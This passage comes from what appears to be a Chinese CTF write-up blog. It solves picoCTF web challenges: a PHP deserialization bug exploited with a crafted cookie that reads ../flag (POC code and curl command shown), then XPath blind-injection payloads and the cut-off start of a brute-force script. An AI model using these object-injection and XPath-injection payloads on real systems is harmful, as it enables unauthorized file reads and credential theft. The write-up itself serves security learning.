keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;h6 class="text-center" style="color:red">Invalid Login.&lt;/h6>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>get到一个cookie.php，当然，可以使用上面的方法，得到它的源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">permissions</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$u</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token variable">$u</span><span class="token punctuation">.</span><span class="token variable">$p</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">is_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$guest</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>                <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"../users.db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span>                <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span>                <span class="token variable">$stm</span> <span class="token operator">=</span> <span class="token variable">$con</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"SELECT admin, username FROM users WHERE username=? AND password=?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$stm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token constant">SQLITE3_TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$stm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token constant">SQLITE3_TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$stm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$rest</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$rest</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$rest</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                <span class="token variable">$guest</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">return</span> <span class="token variable">$guest</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>                <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"../users.db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span>                <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span>                <span class="token variable">$stm</span> <span class="token operator">=</span> <span class="token variable">$con</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"SELECT admin, username FROM users WHERE username=? AND password=?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$stm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token constant">SQLITE3_TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$stm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token constant">SQLITE3_TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$stm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$rest</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$rest</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$rest</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">return</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"login"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>                <span class="token variable">$perm</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"login"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$perm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$perm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span><span class="token punctuation">(</span>Error <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Deserialization error. "</span><span class="token punctuation">.</span><span class="token variable">$perm</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>然后还有<code>authentication.php</code>，老办法</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">access_log</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$log_file</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$lf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log_file</span> <span class="token operator">=</span> <span class="token variable">$lf</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read_log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">append_to_log</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log_file</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">read_log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"cookie.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$perm</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$perm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Welcome admin"</span><span class="token punctuation">;</span>        <span class="token variable">$log</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">access_log</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"access.log"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$log</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append_to_log</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Logged in at "</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Y-m-d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Welcome guest"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>style.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js<span class="token punctuation">"</span></span> <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-sm-9 col-md-7 col-lg-5 mx-auto<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card card-signin my-5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card-body<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                                                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card-title text-center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$msg</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">></span></span>                                                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                                                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-lg btn-primary btn-block text-uppercase<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>document.cookie=<span class="token punctuation">'</span>user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;<span class="token punctuation">'</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Go back to login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>                                                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>                                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>看到了反序列化。梳理一下代码逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//首先是这里读取文件，结合hint：The flag is at ../flag。所以这里是最后的getflag的地方，要想办法执行到这里。</span><span class="token keyword">function</span> <span class="token function">append_to_log</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log_file</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">read_log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//然后需要执行到authentication.php，就需要这里</span><span class="token variable">$perm_res</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">permissions</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$perm_res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$perm_res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"login"</span><span class="token punctuation">,</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$perm_res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">86400</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: authentication.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//perm_res实例化一个对象，该类在cookie.php中。</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"login"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>                <span class="token variable">$perm</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"login"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$perm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$perm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span><span class="token punctuation">(</span>Error <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Deserialization error. "</span><span class="token punctuation">.</span><span class="token variable">$perm</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//执行过</span><span class="token comment">//执行到这里，才算是完全将整个逻辑梳理下来</span><span class="token comment">//perm_res——>cookie::login——>authentication.php::read_log()——>捕获Error</span></code></pre><p>POC构造</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">access_log</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$log_file</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$lf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log_file</span> <span class="token operator">=</span> <span class="token variable">$lf</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read_log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">append_to_log</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log_file</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">read_log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$perm_res</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">access_log</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"../flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$perm_res_encoded</span> <span class="token operator">=</span>  <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$perm_res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$perm_res_encoded</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9</code></pre><p>exp</p><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF<span class="token punctuation">]</span>└─<span class="token comment"># curl http://mercury.picoctf.net:2148/authentication.php -H "Cookie: login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9;"</span>Deserialization error. picoCTF<span class="token punctuation">&#123;</span>th15_vu1n_1s_5up3r_53r1ous_y4ll_8db8f85c<span class="token punctuation">&#125;</span></code></pre><h1 id="X-marks-the-spot"><a href="#X-marks-the-spot" class="headerlink" title="X marks the spot"></a>X marks the spot</h1><p>XPATH注入<br>学习参考<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection">XPATH Injection</a><br>盲注字符串长度</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">and</span> string<span class="token operator">-</span><span class="token function">length</span><span class="token punctuation">(</span>account<span class="token punctuation">)</span><span class="token operator">=</span><span class="token constant">SIZE_INT</span></code></pre><p>逐个猜测每一个字母</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">substring</span><span class="token punctuation">(</span><span class="token comment">//user[userid=5]/username,2,1)=CHAR_HERE</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token comment">//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)</span></code></pre><p>尝试注入</p><pre class="language-xml" data-language="xml"><code class="language-xml">' or string-length(//user[position()=1]/pass)>1 or 'a'='</code></pre><p>这个是测试flag的长度是否大于1，如果是应该返回正确的。<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210808224822301.png" alt="image-20210808224822301" loading="lazy"></p><p>由此，写出脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> string<span class="token keyword">import</span> urllibuser_id <span class="token operator">=</span> <span class="token number">3</span>password <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">with</span> log<span class="token 